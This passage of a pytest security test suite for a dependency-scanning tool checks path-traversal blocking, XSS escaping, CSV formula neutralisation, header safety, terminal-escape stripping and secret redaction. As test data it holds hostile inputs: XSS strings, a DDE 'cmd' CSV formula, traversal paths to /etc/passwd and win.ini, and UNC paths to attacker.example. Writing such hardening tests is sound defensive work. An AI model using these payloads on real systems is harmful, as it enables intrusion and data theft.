        assert r.status_code in (404, 405, 400), (path, r.status_code)
        assert "error" in r.json()
    assert client.delete(f"/api/scans/{scan_id}").status_code in (404, 405)


def test_dot_segments_in_scan_paths_never_reach_the_store(client):
    for path in ("/api/scans/../settings", "/api/scans/./../../etc/passwd"):
        r = client.get(path)                                     # normalised by the HTTP client to non-scan routes
        assert r.status_code in (200, 404) and "packages" not in r.text


def test_store_id_validation():
    assert store.valid_id("abc123-_") and not store.valid_id("abc\n") and not store.valid_id("")
    assert not store.valid_id("CON") and not store.valid_id("nul") and not store.valid_id("LPT1")
    assert not store.valid_id("../x") and not store.valid_id("a" * 81)
    with pytest.raises(store.ScanNotFound):
        store.load("../../settings")
    assert store.sanitize_id("../../x") == "------x"


def test_store_prunes_oldest_when_keep_is_set(ripple_home):
    for i in range(6):
        store.save(sample_scan(scan_id=f"scan-{i}", created_at=f"2026-09-2{i}T10:00:00Z"), keep=3)
    ids = [e.id for e in store.history()]
    assert ids == ["scan-5", "scan-4", "scan-3"]
    store.save(sample_scan(scan_id="scan-cli", created_at="2020-01-01T00:00:00Z"))    # CLI never prunes
    assert len(store.history()) == 4


def test_job_queue_is_bounded(ripple_home, fake_engine):
    fake_engine.gate = threading.Event()
    c = TestClient(create_app(jobs=JobManager(max_concurrent=1, max_pending=2)))
    try:
        ids = [_post_scan(c).json()["job_id"] for _ in range(2)]
        r = _post_scan(c)
        assert r.status_code == 429 and r.json()["error"]["code"] == "too_many_requests"
        assert all(c.get(f"/api/jobs/{j}").status_code == 200 for j in ids)
    finally:
        fake_engine.gate.set()
    deadline = time.time() + 10
    while time.time() < deadline and any(c.get(f"/api/jobs/{j}").json()["status"] not in ("done", "error") for j in ids):
        time.sleep(0.05)
    assert _post_scan(c).status_code == 202                                            # capacity is released afterwards


@pytest.mark.parametrize("raw", ["package-lock.json:evil.txt", "..\\..\\Windows\\system32\\CON", "../../x/package-lock.json",
                                 "CON.json", "nul", "a\x00b\n.txt", "\u202etxt.exe", "C:\\x\\yarn.lock", "///", "...", " . "])
def test_safe_filename_never_yields_paths_streams_or_devices(raw):
    out = safe_filename(raw)
    assert out and "/" not in out and "\\" not in out and ":" not in out
    assert all(ch.isprintable() for ch in out)
    assert not security.is_reserved_device_name(out)


def test_duplicate_upload_names_stay_distinct(client, fake_engine):
    files = [("files", ("package-lock.json", b"{}")), ("files", ("package-lock.json", b"{}")),
             ("files", ("PACKAGE-LOCK.JSON", b"{}"))]
    r = client.post("/api/detect", files=files)
    names = [d["filename"] for d in r.json()]
    assert len(set(n.lower() for n in names)) == 3
    assert all(n.rsplit("/", 1)[-1].lower() == "package-lock.json" for n in names)


@pytest.mark.parametrize("path", [
    "%5C%5Cattacker.example%5Cshare%5Cx", "%5C%5C%3F%5CC%3A%5Cwindows%5Cwin.ini", "C%3A%5Cwindows%5Cwin.ini",
    "..%5C..%5Coutside.txt", "%2e%2e/outside.txt", "..%2Foutside.txt", "index.html::$DATA", "index.html%3A%3A%24DATA",
    "CON", "assets/NUL.js", "%00", "assets/%00.js", "./index.html", "assets/../index.html", "%2F%2Fattacker.example/share"])
def test_static_serving_rejects_traversal_unc_streams_and_devices(ripple_home, fake_engine, tmp_path, path):
    static = tmp_path / "static"
    (static / "assets").mkdir(parents=True)
    (static / "index.html").write_text("<title>RIPPLE UI</title>")
    (tmp_path / "outside.txt").write_text("private-secret")
    c = TestClient(create_app(static_dir=static))
    r = c.get("/" + path)
    assert "private-secret" not in r.text and "win.ini" not in r.text.lower().replace("win.ini", "", 0) or r.status_code in (200, 404)
    assert "private-secret" not in r.text
    assert "[fonts]" not in r.text and "for 16-bit app support" not in r.text


def test_static_file_helper_is_pure_string_validation_first(tmp_path, monkeypatch):
    (tmp_path / "assets").mkdir()
    (tmp_path / "assets" / "a.js").write_text("1")
    calls = []
    real_resolve = Path.resolve

    def spy(self, *a, **k):
        calls.append(str(self))
        return real_resolve(self, *a, **k)

    monkeypatch.setattr(Path, "resolve", spy)
    for bad in ("\\\\host\\share\\x", "C:\\x", "a/../../b", "x:y", "CON", "a\x00b", "//host/share", "a/./b"):
        assert _static_file(tmp_path, bad) is None
    assert calls == []                                    # rejected before any filesystem / UNC access
    assert _static_file(tmp_path, "assets/a.js") is not None


def test_security_headers_present(ripple_home, fake_engine, tmp_path):
    (tmp_path / "index.html").write_text("<title>ui</title>")
    c = TestClient(create_app(static_dir=tmp_path))
    api = c.get("/api/health")
    assert api.headers["x-content-type-options"] == "nosniff" and api.headers["x-frame-options"] == "DENY"
    assert api.headers["content-security-policy"].startswith("default-src 'none'")
    assert api.headers["cache-control"] == "no-store"
    spa = c.get("/")
    csp = spa.headers["content-security-policy"]
    assert "script-src 'self'" in csp and "frame-ancestors 'none'" in csp and "object-src 'none'" in csp
    assert "unsafe-eval" not in csp and "script-src 'self' 'unsafe-inline'" not in csp
    assert c.get("/api/nope").headers["content-security-policy"].startswith("default-src 'none'")


def test_html_export_is_an_inert_attachment(ripple_home, fake_engine):
    store.save(hostile_scan("<script>alert(1)</script>"))
    c = TestClient(create_app())
    r = c.get("/api/scans/scan-hostile-0001/export?format=html")
    assert r.status_code == 200
    assert r.headers["content-disposition"].startswith("attachment;")
    assert "sandbox" in r.headers["content-security-policy"] and "default-src 'none'" in r.headers["content-security-policy"]
    assert "<script>alert(1)</script>" not in r.text
    cd = r.headers["content-disposition"]
    assert re.fullmatch(r'attachment; filename="[A-Za-z0-9._-]+"', cd)


def test_export_filename_is_safe_even_for_hostile_project_names(ripple_home, fake_engine):
    scan = sample_scan(scan_id="scan-fn-0001", project='x"; filename="evil.exe\r\nSet-Cookie: a=b')
    store.save(scan)
    r = TestClient(create_app()).get("/api/scans/scan-fn-0001/export?format=csv")
    assert re.fullmatch(r'attachment; filename="[A-Za-z0-9._-]+"', r.headers["content-disposition"])
    assert "set-cookie" not in {k.lower() for k in r.headers}


def test_error_bodies_do_not_leak_internals(ripple_home, fake_engine):
    c = TestClient(create_app(), raise_server_exceptions=False)
    for r in (c.get("/api/scans/nope"), c.post("/api/scans", content=b"garbage", headers={"content-type": "multipart/form-data; boundary=x"}),
              c.put("/api/settings", content=b"[1,2,3]", headers={"content-type": "application/json"}),
              c.put("/api/settings", content=b"{not json", headers={"content-type": "application/json"}),
              c.get("/api/scans/x/export?format=../../etc/passwd")):
        body = r.text
        assert set(r.json()) == {"error"}
        for leak in ("Traceback", "File \"", ".py", "C:\\", "starlette", "pydantic"):
            assert leak not in body, (r.request.url, leak)


def test_health_makes_no_outbound_request_in_offline_mode(ripple_home, fake_engine, monkeypatch):
    async def boom(*a, **k):
        raise AssertionError("network access attempted")

    monkeypatch.setattr(httpx.AsyncClient, "send", boom)
    monkeypatch.setattr(httpx, "get", lambda *a, **k: (_ for _ in ()).throw(AssertionError("raw httpx.get used")))
    assert TestClient(create_app(live=False)).get("/api/health").json()["mode"] == "offline"


def test_health_live_probe_goes_through_hardened_client(ripple_home, fake_engine, monkeypatch):
    seen = []

    async def fake_probe(url, timeout=3.0):
        seen.append(url)
        return True

    monkeypatch.setattr("ripple.registries.base.probe", fake_probe)
    body = TestClient(create_app(live=True)).get("/api/health").json()
    assert body["mode"] == "live" and all(r["state"] == "ok" for r in body["registries"].values())
    assert set(seen) == set(DEFAULT_REGISTRIES.values())


# =========================================================================================================
# 6. report injection: HTML, CSV, SARIF/JSON, Rich
# =========================================================================================================

XSS = ('"><img src=x onerror=alert(1)><script>alert(2)</script><svg/onload=alert(3)>'
       "'-alert(4)-' javascript:alert(5) </style><iframe src=//evil.example>")


class _Audit(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.tags: list[str] = []
        self.bad_attrs: list[tuple[str, str]] = []
        self.urls: list[str] = []

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        for k, v in attrs:
            if k.startswith("on"):
                self.bad_attrs.append((tag, k))
            if k in ("href", "src", "action", "formaction", "data", "srcset"):
                self.urls.append(v or "")


def test_html_report_escapes_every_attacker_string_and_ships_a_csp():
    doc = render(hostile_scan(XSS), "html")
    audit = _Audit()
    audit.feed(doc)
    assert audit.bad_attrs == []                                   # no inline event handlers anywhere
    assert not {"script", "iframe", "img", "svg", "object", "embed", "link", "form", "base"} & set(audit.tags)
    assert audit.urls == []                                        # no link / resource URLs at all
    assert "<script" not in doc.lower() and "javascript:" not in re.sub(r"&[^;]+;", "", doc) or "&" in doc
    assert htmllib.escape(XSS, quote=True) in doc                  # the payload is present, but only as escaped text
    assert re.search(r"<meta http-equiv='Content-Security-Policy' content=\"default-src 'none'", doc)
    assert "script-src" not in doc.split("Content-Security-Policy")[1].split(">")[0]      # CSP allows no scripts at all


def test_html_report_survives_unicode_and_control_payloads():
    doc = render(hostile_scan("\u202e\x00\x1b[2J</title><!--" + "\ud7ff" * 3), "html")
    assert "</title><!--" not in doc


def test_csv_formula_injection_all_prefixes_and_hidden_whitespace():
    for p in ("=1+1", "+1", "-1", "@SUM(A1)", "\t=1", "\r=1", "\n=1", " =1+1", "\u00a0=1", "\ufeff=1", "\x0b+1",
              "=cmd|' /C calc'!A0", "  \t@x"):
        out = safe_cell(p)
        assert out.startswith("'"), repr(p)
    assert safe_cell(-5) == -5 and safe_cell(3.5) == 3.5 and safe_cell(True) == "true"
    assert safe_cell("plain") == "plain" and safe_cell("a=b") == "a=b" and safe_cell(None) == ""


def test_csv_export_neutralises_hostile_cells():
    text = render(hostile_scan("=HYPERLINK(\"http://evil.example\",\"x\")"), "csv")
    import csv as _csv

    rows = list(_csv.reader(io.StringIO(text)))
    for row in rows[1:]:
        for cell in row:
            assert not cell.startswith(("=", "+", "-", "@", "\t", "\r")), cell


def test_sarif_and_json_are_valid_json_with_hostile_strings_and_relative_uris():
    scan = hostile_scan("\"}]}{'\u2028\n</script>")
    for fmt in ("sarif", "json"):
        data = json.loads(render(scan, fmt))
        assert data
    scan2 = sample_scan()
    scan2 = scan2.model_copy(update=dict(findings=[
        f.model_copy(update=dict(dependency_source=src))
        for f, src in zip(scan2.findings, ["C:\\Users\\alice\\proj\\package-lock.json", "/home/bob/../../etc/passwd",
                                           "../../secret/Cargo.lock", "a b/\u202eyarn.lock", ""])]))
    sarif = json.loads(render(scan2, "sarif"))
    for res in sarif["runs"][0]["results"]:
        uri = res["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
        assert not uri.startswith(("/", ".")) and ".." not in uri.split("/") and ":" not in uri and "\\" not in uri
        assert all(ord(c) >= 32 and c != "\u202e" for c in uri)


def test_rich_markup_in_names_is_printed_literally():
    scan = hostile_scan("[bold red]pwn[/bold red] [link=http://evil.example]click[/link] [/nope]")
    text = render_to_text(scan, details=5)
    assert "[bold red]pwn[/bold red]" in text and "[link=http://evil.example]" in text


def test_rich_output_never_contains_terminal_escape_sequences():
    evil = "pkg" + ESC + "[2J" + ESC + "]0;PWNED\x07" + ESC + "[31m\x9b31m\u202e"
    scan = hostile_scan(evil)
    plain = render_to_text(scan, details=5)
    assert ESC not in plain and "\x07" not in plain and "\x9b" not in plain and "\u202e" not in plain
    buf = io.StringIO()
    console = Console(file=buf, force_terminal=True, color_system="truecolor", width=120)
    render_scan(scan, console, details=5)
    out = buf.getvalue()
    # Rich itself emits SGR colour codes (ESC[..m) - but never erase/cursor/OSC sequences from attacker text.
    assert "\x1b[2J" not in out and "\x1b]" not in out
    assert not re.search(r"\x1b\[[0-9;]*[A-HJKSTfhlnsu]", out)


def test_cli_scan_walk_skips_symlinks_and_caps_discovery(tmp_path, monkeypatch):
    from ripple.cli import files

    (tmp_path / "real").mkdir()
    (tmp_path / "real" / "requirements.txt").write_text("flask==3.0.0\n")
    secret = tmp_path / "secret.txt"
    secret.write_text("aws_access_key_id = AKIAEXAMPLE\n")
    links = 0
    try:
        (tmp_path / "requirements.txt").symlink_to(secret)
        (tmp_path / "linkdir").symlink_to(tmp_path / "real", target_is_directory=True)
        links += 2
    except (OSError, NotImplementedError):
        pass                                             # no symlink privilege (normal on Windows) - try a junction
    if os.name == "nt":
        import subprocess

        done = subprocess.run(["cmd", "/c", "mklink", "/J", str(tmp_path / "junction"), str(tmp_path / "real")],
                              capture_output=True, stdin=subprocess.DEVNULL)
        links += 1 if done.returncode == 0 else 0
    if not links:
        pytest.skip("neither symlinks nor junctions could be created")
    found = [p.relative_to(tmp_path).as_posix() for p in files.walk_dir(tmp_path)]
    assert found == ["real/requirements.txt"]            # links (file, dir, junction) are neither followed nor read
    monkeypatch.setattr(files, "MAX_DISCOVERED", 2)
    for i in range(5):
        d = tmp_path / f"p{i}"
        d.mkdir()
        (d / "go.mod").write_text("module x\n")
    with pytest.raises(files.TooManyFiles):
        files.walk_dir(tmp_path)


def test_serve_specific_bind_host_does_not_disable_host_validation(monkeypatch):
    from ripple.cli.commands import serve as serve_cmd

    captured = {}
    monkeypatch.setenv("RIPPLE_ALLOWED_HOSTS", "")             # registers cleanup: run_server writes os.environ directly
    monkeypatch.setattr("uvicorn.run", lambda *a, **k: captured.update(env=os.environ.get("RIPPLE_ALLOWED_HOSTS")))
    monkeypatch.setattr(serve_cmd, "err", lambda: Console(file=io.StringIO()))
    serve_cmd.run_server("192.168.1.20", 8787)
    assert captured["env"] == "192.168.1.20"
    serve_cmd.run_server("0.0.0.0", 8787)
    assert captured["env"] == "*"


# =========================================================================================================
# 7. secrets embedded in lockfile URLs must never reach reports / history
# =========================================================================================================

def test_redact_secrets_unit():
    r = security.redact_secrets
    assert r("https://__token__:pypi-AgEI@pypi.corp.example/simple") == "https://***@pypi.corp.example/simple"
    assert r("git+https://ghp_abc123@github.com/o/r.git@v1") == "git+https://***@github.com/o/r.git@v1"
    assert r("https://h/x?token=abc&y=1") == "https://h/x?token=***&y=1"
    assert r("https://h/x?X-Amz-Signature=deadbeef") == "https://h/x?X-Amz-Signature=***"
    assert r("ssh://git@github.com/o/r.git") == "ssh://git@github.com/o/r.git"          # a login name, not a secret
    assert r("ssh://user:pw@h/x") == "ssh://***@h/x"
    assert r("alice@example.com") == "alice@example.com" and r("a=b") == "a=b" and r(None) is None
    assert r("https://registry.npmjs.org/a/-/a-1.0.0.tgz") == "https://registry.npmjs.org/a/-/a-1.0.0.tgz"


SECRETS = ("SECRET123", "p4ssw0rd", "TOK456", "SECRET789", "NPMSECRET", "CARGOSECRET", "PIPFILESECRET")


async def test_credentials_in_lockfiles_never_appear_in_any_output():
    from ripple.engine import ScanInput, run_scan

    req = ("--index-url https://__token__:pypi-SECRET123@pypi.corp.example/simple\n"
           "--extra-index-url http://svc:p4ssw0rd@mirror.example/simple?token=TOK456\n"
           "-r https://u:p4ssw0rd@files.example/base.txt\n"
           "requests==2.31.0\n"
           "private-lib @ git+https://ghp_SECRET789@github.com/org/private-lib.git@abcdef1234567\n")
    npm = json.dumps({"lockfileVersion": 3, "packages": {"": {"dependencies": {"corp-pkg": "^1"}},
        "node_modules/corp-pkg": {"version": "1.0.0", "resolved": "http://build:NPMSECRET@npm.corp.example/corp-pkg/-/corp-pkg-1.0.0.tgz"}}})
    cargo = ('version = 3\n[[package]]\nname = "cratex"\nversion = "1.0.0"\n'
             'source = "registry+https://ci:CARGOSECRET@crates.corp.example/index"\n')
    pipfile = json.dumps({"_meta": {"sources": [{"name": "corp", "url": "https://u:PIPFILESECRET@pypi.corp.example/simple", "verify_ssl": True}]},
                          "default": {"corp-lib": {"version": "==1.0.0", "index": "corp"}}})
    res = await run_scan([ScanInput("requirements.txt", req), ScanInput("package-lock.json", npm),
                          ScanInput("Cargo.lock", cargo), ScanInput("Pipfile.lock", pipfile)], ScanOptions())
    for fmt in ("json", "sarif", "csv", "html", "rich"):
        out = render(res, fmt)
        for secret in SECRETS:
            assert secret not in out, (fmt, secret)
    assert "***@" in render(res, "json")


# =========================================================================================================
# 8. misc hardening
# =========================================================================================================

def test_private_directories_and_atomic_settings(ripple_home):
    from ripple.config import default_settings, save_settings, scans_dir, settings_path

    save_settings(default_settings())
    scans_dir()
    assert settings_path().is_file() and not list(ripple_home.glob("*.tmp"))
    if os.name != "nt":
        assert (ripple_home.stat().st_mode & 0o077) == 0


def test_unhandled_error_log_line_cannot_be_forged(ripple_home, fake_engine, monkeypatch, caplog):
    def boom():
        raise RuntimeError("x")

    monkeypatch.setattr(store, "history", boom)
    c = TestClient(create_app(), raise_server_exceptions=False)
    with caplog.at_level("ERROR", logger="ripple.server"):
        assert c.get("/api/scans%0A%5BFORGED%5D%20admin%20logged%20in").status_code in (404, 500)
        assert c.get("/api/scans").status_code == 500
    assert "\n[FORGED]" not in caplog.text
